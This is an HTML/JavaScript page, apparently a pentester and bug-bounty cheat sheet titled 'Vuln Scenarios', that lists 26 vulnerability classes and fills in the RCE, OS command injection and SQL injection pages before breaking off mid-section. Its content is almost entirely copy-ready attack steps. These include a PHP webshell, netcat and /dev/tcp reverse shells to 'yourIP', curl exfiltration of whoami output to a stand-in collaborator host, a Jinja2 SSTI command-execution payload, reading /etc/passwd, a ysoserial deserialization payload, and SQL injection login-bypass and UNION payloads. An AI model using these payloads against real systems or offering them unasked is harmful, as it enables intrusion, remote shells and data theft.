<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Vuln Scenarios</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Inter', sans-serif;
        }

        .sidebar-scroll::-webkit-scrollbar {
            width: 6px;
        }
        .sidebar-scroll::-webkit-scrollbar-track {
            background: #1f2937; 
        }
        .sidebar-scroll::-webkit-scrollbar-thumb {
            background: #4b5563; 
            border-radius: 3px;
        }
        .sidebar-scroll::-webkit-scrollbar-thumb:hover {
            background: #6b7280; 
        }

        .sidebar-link.active {
            background-color: #374151; 
            color: #ffffff; 
            font-weight: 600;
        }

        .sidebar-link {
            transition: background-color 0.2s ease-in-out, color 0.2s ease-in-out;
        }

        .page-content {
            display: none;
        }

        .page-content.active {
            display: block;
        }

        .code-block-wrapper {
            position: relative;
        }
        .copy-button {
            position: absolute;
            top: 0.5rem;
            right: 0.5rem;
            background-color: #4a5568;
            color: white;
            border: none;
            padding: 0.25rem 0.5rem;
            border-radius: 0.25rem;
            font-size: 0.8rem;
            cursor: pointer;
            transition: background-color 0.2s;
        }
        .copy-button:hover {
            background-color: #2d3748;
        }
    </style>
</head>
<body class="bg-gray-100 dark:bg-gray-900 text-gray-900 dark:text-gray-100">
    <div class="flex h-screen">

        <aside id="sidebar" class="w-64 bg-gray-900 text-gray-200 flex flex-col fixed h-full transition-transform duration-300 ease-in-out md:translate-x-0 -translate-x-full z-30">
            <div class="px-6 py-4 border-b border-gray-700">
                <a href="#welcome" id="home-link" class="text-xl font-semibold text-white">Vuln Scenarios</a>
            </div>
            <nav class="flex-1 overflow-y-auto sidebar-scroll">
                <ul id="vuln-list" class="py-4">

                </ul>
            </nav>
        </aside>


        <div class="flex-1 flex flex-col md:ml-64 transition-all duration-300 ease-in-out">
            <header class="bg-white dark:bg-gray-800 shadow-md p-4 flex justify-between items-center">
                 <button id="menu-toggle" class="md:hidden text-gray-600 dark:text-gray-300 focus:outline-none">
                    <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 6h16M4 12h16M4 18h16"></path></svg>
                </button>
                <h1 id="page-title" class="text-2xl font-bold text-gray-800 dark:text-white">Welcome</h1>
            </header>
            <main id="main-content" class="flex-1 p-6 overflow-y-auto">

                <div id="page-welcome" class="page-content active prose dark:prose-invert max-w-none">
                    <h1 class="text-3xl font-bold mb-4">Welcome to Vulns Scenarios</h1>
                    <p>Select a vulnerability from the left panel to start seeing 5 of it’s scenarios.</p>
                    <p>This is a simple, client-side application designed to help you explore various vulnerability scenarios. All content is stored locally in your browser.</p>
                </div>
            </main>
        </div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function () {

            const vulnerabilities = [
                { name: 'RCE', level: 'Critical' },
                { name: 'OS Command Injection', level: 'Critical' },
                { name: 'SQL Injection', level: 'Critical' },
                { name: 'Insecure Deserialization', level: 'Critical' },
                { name: 'SSTI', level: 'Critical' },
                { name: 'Authentication Vulns', level: 'High' },
                { name: 'Broken Access Control', level: 'High' },
                { name: 'IDOR', level: 'High' },
                { name: 'File Upload Vulns', level: 'High' },
                { name: 'XXE', level: 'High' },
                { name: 'SSRF', level: 'High' },
                { name: 'Path Traversal', level: 'High' },
                { name: 'XSS', level: 'Medium' },
                { name: 'CSRF', level: 'Medium' },
                { name: 'JWT Attacks', level: 'Medium' },
                { name: 'Logic Vulnerabilities', level: 'Medium' },
                { name: 'GraphQL Hacking', level: 'Medium' },
                { name: 'Race Condition', level: 'Medium' },
                { name: 'Subdomain Takeover', level: 'Medium' },
                { name: 'Cache Poisoning', level: 'Medium' },
                { name: 'Host Header Injection', level: 'Medium' },
                { name: 'WordPress Hacking', level: 'Medium' },
                { name: 'Hacking LLM', level: 'Medium' },
                { name: 'CORS Misconfiguration', level: 'Low' },
                { name: 'Clickjacking', level: 'Low' },
                { name: 'Open Redirect', level: 'Low' }
            ];

            const criticalityColors = {
                'Critical': 'bg-red-500',
                'High': 'bg-orange-500',
                'Medium': 'bg-yellow-400',
                'Low': 'bg-blue-500'
            };

            const vulnList = document.getElementById('vuln-list');
            const mainContent = document.getElementById('main-content');
            const pageTitle = document.getElementById('page-title');
            const menuToggle = document.getElementById('menu-toggle');
            const sidebar = document.getElementById('sidebar');
            const homeLink = document.getElementById('home-link');

            const createSlug = (name) => name.toLowerCase().replace(/\s+/g, '-');

            vulnerabilities.forEach(vuln => {
                const slug = createSlug(vuln.name);
                const colorClass = criticalityColors[vuln.level];

                const li = document.createElement('li');
                const a = document.createElement('a');
                a.href = `#${slug}`;
                a.dataset.page = slug;
                a.className = 'sidebar-link flex items-center py-2.5 px-6 rounded-md mx-2 my-1 hover:bg-gray-700 hover:text-white';
                
                a.innerHTML = `
                    <span class="w-3 h-3 ${colorClass} rounded-full mr-3 flex-shrink-0"></span>
                    <span>${vuln.name}</span>
                `;

                li.appendChild(a);
                vulnList.appendChild(li);

                const pageDiv = document.createElement('div');
                pageDiv.id = `page-${slug}`;
                pageDiv.className = 'page-content prose dark:prose-invert max-w-none';
                
                if (vuln.name === 'RCE') {
                    pageDiv.innerHTML = `
                        <h1 class="text-3xl font-bold mb-4">RCE (Remote Code Execution)</h1>
                        
                        <div class="space-y-6">
                            <div>
                                <h2 class="text-2xl font-semibold border-b border-gray-600 pb-2 mb-3">✅ Scenario 1. File Upload + LFI Combination for RCE</h2>
                                <p class="mb-2">💡 <strong>Goal:</strong> Upload PHP shell and include it via LFI vulnerability.</p>
                                <p><strong>Steps:</strong></p>
                                <ol class="list-decimal list-inside space-y-2">
                                    <li><strong>Identify upload functionality:</strong> Go to pages like profile picture, document upload, or any form that allows file uploads.</li>
                                    <li><strong>Test file type restrictions:</strong> Try uploading <code>shell.php</code>. If blocked, try <code>shell.php.jpg</code> or double extensions like <code>shell.jpg.php</code>.</li>
                                    <li><strong>Upload webshell payload:</strong>
                                        <div class="code-block-wrapper my-2">
                                            <button class="copy-button">Copy</button>
                                            <pre class="bg-gray-800 text-white p-4 rounded-md"><code class="language-php">&lt;?php system($_GET['cmd']); ?&gt;</code></pre>
                                        </div>
                                    </li>
                                    <li><strong>Find LFI vulnerable parameter:</strong> Browse endpoints with parameters like <code>?page=home.php</code>. Test <code>?page=../../uploads/shell.php</code> or the exact upload path.</li>
                                    <li><strong>Execute commands:</strong> Visit <code>http://target/page.php?page=../../uploads/shell.php&cmd=id</code>. Confirm command execution by output (<code>uid=33(www-data)</code> etc.).</li>
                                </ol>
                            </div>

                            <div>
                                <h2 class="text-2xl font-semibold border-b border-gray-600 pb-2 mb-3">✅ Scenario 2. Command Injection via Diagnostic Parameter</h2>
                                <p class="mb-2">💡 <strong>Goal:</strong> Inject commands into diagnostic tools (ping, traceroute) parameters.</p>
                                <ol class="list-decimal list-inside space-y-2">
                                    <li><strong>Look for diagnostic tools:</strong> Common in admin panels or support tools: Ping IP, Traceroute, DNS Lookup.</li>
                                    <li><strong>Input a normal IP to check output:</strong> <code>8.8.8.8</code></li>
                                    <li><strong>Test injection with simple payloads:</strong> <code>8.8.8.8; whoami</code>, <code>8.8.8.8 && id</code>, <code>8.8.8.8 | id</code>. Observe output. If output shows your command result (<code>root</code>, <code>www-data</code>), it is vulnerable.</li>
                                    <li><strong>Chain further commands:</strong> Use <code>; nc yourIP 4444 -e /bin/bash</code> for a reverse shell (ensure listener with <code>nc -lvnp 4444</code>).</li>
                                </ol>
                            </div>
                            
                            <div>
                                <h2 class="text-2xl font-semibold border-b border-gray-600 pb-2 mb-3">✅ Scenario 3. Exploiting Outdated WordPress Plugin for RCE</h2>
                                <p class="mb-2">💡 <strong>Goal:</strong> Gain RCE via vulnerable plugin exploit.</p>
                                <ol class="list-decimal list-inside space-y-2">
                                    <li><strong>Scan WordPress version and plugins:</strong> Use wpscan:
                                        <div class="code-block-wrapper my-2">
                                            <button class="copy-button">Copy</button>
                                            <pre class="bg-gray-800 text-white p-4 rounded-md"><code class="language-bash">wpscan --url http://target --enumerate vp</code></pre>
                                        </div>
                                    </li>
                                    <li><strong>Check exploit-db or GitHub for exploits.</strong> For example, vulnerable plugin "File Manager" <= 6.8 has direct RCE.</li>
                                    <li><strong>Run exploit or manual payload.</strong> Often involves uploading a PHP shell directly via the plugin vulnerability.</li>
                                    <li><strong>Verify shell access</strong> and execute:
                                         <div class="code-block-wrapper my-2">
                                            <button class="copy-button">Copy</button>
                                            <pre class="bg-gray-800 text-white p-4 rounded-md"><code class="language-bash">http://target/wp-content/uploads/shell.php?cmd=id</code></pre>
                                        </div>
                                    </li>
                                </ol>
                            </div>

                            <div>
                                <h2 class="text-2xl font-semibold border-b border-gray-600 pb-2 mb-3">✅ Scenario 4. Template Injection → RCE</h2>
                                <p class="mb-2">💡 <strong>Goal:</strong> Use template injection to escape sandbox and run OS commands.</p>
                                <ol class="list-decimal list-inside space-y-2">
                                    <li><strong>Find input rendered in templates</strong> (e.g., <code>{{username}}</code> in Flask/Jinja2 apps).</li>
                                    <li><strong>Test for SSTI with harmless payload:</strong> <code>{{7*7}}</code> → Should render <code>49</code>.</li>
                                    <li><strong>Exploit for RCE (Jinja2 example):</strong>
                                        <p class="mt-2">Payload to read environment variables:</p>
                                        <div class="code-block-wrapper my-2">
                                            <button class="copy-button">Copy</button>
                                            <pre class="bg-gray-800 text-white p-4 rounded-md"><code class="language-jinja">{{config.items()}}</code></pre>
                                        </div>
                                         <p class="mt-2">Payload to run OS commands:</p>
                                        <div class="code-block-wrapper my-2">
                                            <button class="copy-button">Copy</button>
                                            <pre class="bg-gray-800 text-white p-4 rounded-md"><code class="language-jinja">{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}</code></pre>
                                        </div>
                                    </li>
                                </ol>
                            </div>
                             <div>
                                <h2 class="text-2xl font-semibold border-b border-gray-600 pb-2 mb-3">✅ Scenario 5. Java Deserialization RCE</h2>
                                <p class="mb-2">💡 <strong>Goal:</strong> Exploit insecure Java deserialization endpoint.</p>
                                <ol class="list-decimal list-inside space-y-2">
                                    <li><strong>Identify Java-based endpoints</strong> (JSF, Struts, Spring).</li>
                                    <li><strong>Find serialized object parameters</strong> (Base64 encoded parameters or binary data in POST requests).</li>
                                    <li><strong>Test with ysoserial payloads.</strong> Generate payload:
                                        <div class="code-block-wrapper my-2">
                                            <button class="copy-button">Copy</button>
                                            <pre class="bg-gray-800 text-white p-4 rounded-md"><code class="language-bash">java -jar ysoserial.jar CommonsCollections1 'id' | base64</code></pre>
                                        </div>
                                    </li>
                                    <li><strong>Replace parameter value with payload</strong> and send the request.</li>
                                </ol>
                            </div>
                        </div>
                    `;
                } else if (vuln.name === 'OS Command Injection') {
                    pageDiv.innerHTML = `
                        <h1 class="text-3xl font-bold mb-4">OS Command Injection</h1>
                        <p class="mb-4">Here is your detailed step-by-step methodology for OS Command Injection exploitation as a real pentester or bug bounty hunter.</p>
                        <div class="space-y-6">
                            <div>
                                <h2 class="text-2xl font-semibold border-b border-gray-600 pb-2 mb-3">✅ Scenario 1. Testing Ping Functionality for Injection</h2>
                                <p class="mb-2">💡 <strong>Goal:</strong> Exploit a ping diagnostic tool to run system commands.</p>
                                <ol class="list-decimal list-inside space-y-2">
                                    <li><strong>Find the feature:</strong> Locate pages with inputs like “Ping an IP address” or “Test server connectivity.”</li>
                                    <li><strong>Test normal input:</strong> <code>8.8.8.8</code>. Confirm it returns a valid ping result.</li>
                                    <li><strong>Try command injection payloads:</strong> <code>8.8.8.8; id</code>, <code>8.8.8.8 && whoami</code>, <code>8.8.8.8 | uname -a</code>.</li>
                                    <li><strong>Observe output:</strong> If you see system information (<code>uid=33(www-data)</code>, kernel info), it is vulnerable.</li>
                                    <li><strong>Exploit further with reverse shell.</strong> Setup listener:
                                        <div class="code-block-wrapper my-2">
                                            <button class="copy-button">Copy</button>
                                            <pre class="bg-gray-800 text-white p-4 rounded-md"><code class="language-bash">nc -lvnp 4444</code></pre>
                                        </div>
                                        Payload:
                                        <div class="code-block-wrapper my-2">
                                            <button class="copy-button">Copy</button>
                                            <pre class="bg-gray-800 text-white p-4 rounded-md"><code class="language-ruby">8.8.8.8; bash -i >& /dev/tcp/yourIP/4444 0>&1</code></pre>
                                        </div>
                                    </li>
                                </ol>
                            </div>
                            <div>
                                <h2 class="text-2xl font-semibold border-b border-gray-600 pb-2 mb-3">✅ Scenario 2. Injection in Traceroute or DNS Lookup</h2>
                                <p class="mb-2">💡 <strong>Goal:</strong> Exploit another diagnostic feature common in routers, panels, or network tools.</p>
                                 <ol class="list-decimal list-inside space-y-2">
                                    <li><strong>Find traceroute or DNS lookup form.</strong></li>
                                    <li><strong>Test with normal domain:</strong> <code>google.com</code>.</li>
                                    <li><strong>Inject payload:</strong> <code>google.com; id</code>, <code>google.com && cat /etc/passwd</code>.</li>
                                    <li><strong>Chain with reverse shell:</strong>
                                        <div class="code-block-wrapper my-2">
                                            <button class="copy-button">Copy</button>
                                            <pre class="bg-gray-800 text-white p-4 rounded-md"><code class="language-bash">google.com; nc yourIP 4444 -e /bin/bash</code></pre>
                                        </div>
                                    </li>
                                </ol>
                            </div>
                            <div>
                                <h2 class="text-2xl font-semibold border-b border-gray-600 pb-2 mb-3">✅ Scenario 3. Web Forms Passing Input to Shell Scripts</h2>
                                <p class="mb-2">💡 <strong>Goal:</strong> Exploit form fields whose inputs are passed directly into server-side shell commands.</p>
                                 <ol class="list-decimal list-inside space-y-2">
                                    <li><strong>Identify forms performing system tasks</strong> (e.g., compress files, rename files).</li>
                                    <li><strong>Try injection payload:</strong> <code>test.txt; ls -la</code>.</li>
                                    <li><strong>Gain interactive shell</strong> using reverse shell payloads.</li>
                                 </ol>
                            </div>
                             <div>
                                <h2 class="text-2xl font-semibold border-b border-gray-600 pb-2 mb-3">✅ Scenario 4. Injection via Headers</h2>
                                <p class="mb-2">💡 <strong>Goal:</strong> Exploit command injection in headers like User-Agent when logs are processed unsafely.</p>
                                 <ol class="list-decimal list-inside space-y-2">
                                    <li><strong>Send request with malicious User-Agent header</strong> using Burp Suite Repeater:
                                        <div class="code-block-wrapper my-2">
                                            <button class="copy-button">Copy</button>
                                            <pre class="bg-gray-800 text-white p-4 rounded-md"><code class="language-bash">User-Agent: test; id</code></pre>
                                        </div>
                                    </li>
                                    <li><strong>Use OOB detection.</strong> Payload:
                                         <div class="code-block-wrapper my-2">
                                            <button class="copy-button">Copy</button>
                                            <pre class="bg-gray-800 text-white p-4 rounded-md"><code class="language-bash">User-Agent: test; curl http://yourburpcollab.com/$(whoami)</code></pre>
                                        </div>
                                    </li>
                                    <li><strong>Check Burp Collaborator</strong> for DNS/HTTP requests.</li>
                                 </ol>
                            </div>
                             <div>
                                <h2 class="text-2xl font-semibold border-b border-gray-600 pb-2 mb-3">✅ Scenario 5. Blind Command Injection Detection</h2>
                                <p class="mb-2">💡 <strong>Goal:</strong> Exploit injection where no output is shown, using time delay.</p>
                                 <ol class="list-decimal list-inside space-y-2">
                                    <li><strong>Input payloads that cause delays:</strong> <code>8.8.8.8; sleep 10</code>.</li>
                                    <li><strong>Send request and measure response time.</strong> If it takes ~10 seconds extra, it's likely vulnerable.</li>
                                    <li><strong>Exploit with OOB techniques.</strong> Payload:
                                        <div class="code-block-wrapper my-2">
                                            <button class="copy-button">Copy</button>
                                            <pre class="bg-gray-800 text-white p-4 rounded-md"><code class="language-bash">8.8.8.8; curl http://yourburpcollab.com/$(whoami)</code></pre>
                                        </div>
                                    </li>
                                 </ol>
                            </div>
                        </div>
                    `;
                } else if (vuln.name === 'SQL Injection') {
                    pageDiv.innerHTML = `
                        <h1 class="text-3xl font-bold mb-4">SQL Injection (SQLi)</h1>
                        <p class="mb-4">Here is your step-by-step practical methodology for SQL Injection exploitation as a pentester or bug bounty hunter.</p>
                        <div class="space-y-6">
                            <div>
                                <h2 class="text-2xl font-semibold border-b border-gray-600 pb-2 mb-3">✅ Scenario 1. Login Form Bypass</h2>
                                <p class="mb-2">💡 <strong>Goal:</strong> Bypass authentication using SQLi payloads.</p>
                                <ol class="list-decimal list-inside space-y-2">
                                    <li><strong>Find login page.</strong> Usual parameters: <code>username</code>, <code>password</code>.</li>
                                    <li><strong>Test payload in username field:</strong>
                                        <div class="code-block-wrapper my-2">
                                            <button class="copy-button">Copy</button>
                                            <pre class="bg-gray-800 text-white p-4 rounded-md"><code class="language-bash">' OR '1'='1'</code></pre>
                                        </div>
                                    </li>
                                    <li><strong>Try other bypass payloads if needed:</strong> <code>' OR 1=1 -- </code>, <code>' OR 'a'='a</code>, <code>admin' -- </code>.</li>
                                    <li><strong>Click login and observe.</strong> If logged in without valid creds, injection successful.</li>
                                </ol>
                            </div>
                            <div>
                                <h2 class="text-2xl font-semibold border-b border-gray-600 pb-2 mb-3">✅ Scenario 2. Union-Based SQLi in Search Parameter</h2>
                                <p class="mb-2">💡 <strong>Goal:</strong> Extract data using UNION SELECT in GET parameters.</p>
                                <ol class="list-decimal list-inside space-y-2">
                                    <li><strong>Find page with GET parameter</strong> returning database content, e.g., <code>http://target/products.php?id=1</code>.</li>
                                    <li><strong>Test for error-based SQLi.</strong> Input: <code>1'</code>. Look for SQL syntax errors.</li>
                                    <li><strong>Determine column count</strong> with payloads like: <code>1' ORDER BY 1 --</code>, <code>1' ORDER BY 2 --</code>, etc.</li>
                                    <li><strong>Test UNION SELECT.</strong> If 3 columns:
                                        <div class="code-block-wrapper my-2">
                                            <button class="copy-button">Copy</button>
                                            <pre class="bg-gray-800 text-white p-4 rounded-md"><code class="language-sql">1' UNION SELECT 1,2,3 --</code></pre>
                                        </div>
                                    </li>
                                    <li><strong>Extract data</strong> by replacing numbers with <code>database()</code>, <code>user()</code>, <code>version()</code>.</li>
                                </ol>
                            </div>
                            <div>
                                <h2 class="text-2xl font-semibold border-b border-gray-600 pb-2 mb-3">✅ Scenario 3. Blind Boolean-Based SQLi</h2>
                                <p class="mb-2">💡 <strong>Goal:</strong> Determine vulnerability when no errors or outputs are shown.</p>
                                <ol class="list-decimal list-inside space-y-2">
                                    <li><strong>Test with always true condition:</strong> <code>2 AND 1=1</code>. Page should be normal.</li>
                                    <li><strong>Test with always false condition:</strong> <code>2 AND 1=2</code>. If page content changes, it’s vulnerable.</li>
                                    <li><strong>Use SQLMap to automate extraction:</strong>
                                        <div class="code-block-wrapper my-2">
                                            <button class="copy-button">Copy</button>
                                            <pre class="bg-gray-800 text-white p-4 rounded-md"><code class="language-bash">sqlmap -u "http://target/item?id=2" --dbs</code></pre>
                                        </div>
                                    </li>
                                </ol>
                            </div>
                            <div>
                                <h2 class="text-2xl font-semibold border-b border-gray-600 pb-2 mb-3">✅ Scenario 4. Time-Based Blind SQLi</h2>
                                <p class="mb-2">💡 <strong>Goal:</strong> Confirm SQLi via response delay where no output or visible changes exist.</p>
                                <ol class="list-decimal list-inside space-y-2">
                                    <li><strong>Test payload causing delay (MySQL):</strong>
                                        <div class="code-block-wrapper my-2">
                                            <button class="copy-button">Copy</button>
                                            <pre class="bg-gray-800 text-white p-4 rounded-md"><code class="language-sql">2' AND SLEEP(5) --</code></pre>
                                        </div>
                                    </li>
                                    <li><strong>Send request and measure response time.</strong> If it takes ~5 seconds longer, it’s vulnerable.</li>
                                    <li><strong>Exploit with SQLMap:</strong>
                                        <div class="code-block-wrapper my-2">
                                            <button class="copy-button">Copy</button>
                                            <pre class="bg-gray-800 text-white p-4 rounded-md"><code class="language-bash">sqlmap -u "http://target/item?id=2" --dbs --technique=T</code></pre>
                                        </div>
                                    </li>
                                </ol>
                            </div>
                            <div>
                                <h2 class="text-2xl font-semibold border-b border-gray-600 pb-2 mb-3">✅ Scenario 5. SQLi in JSON POST Body (API Testing)</h2>
                                <p class="mb-2">💡 <strong>Goal:</strong> Exploit SQLi in API endpoints receiving JSON data.</p>
                                <ol class="list-decimal list-inside space-y-2">
                                    <li><strong>Find API endpoint accepting JSON input.</strong> Modify value to include payload:
                                        <div class="code-block-wrapper my-2">
                                            <button class="copy-button">Copy</button>
                                            <pre class="bg-gray-800 text-white p-4 rounded-md"><code class="language-json">{
  "product_id": "2' OR '1'='1"
}</code></pre>
                                        </div>
                                    </li>
                                    <li><strong>Test UNION-based payloads:</strong>
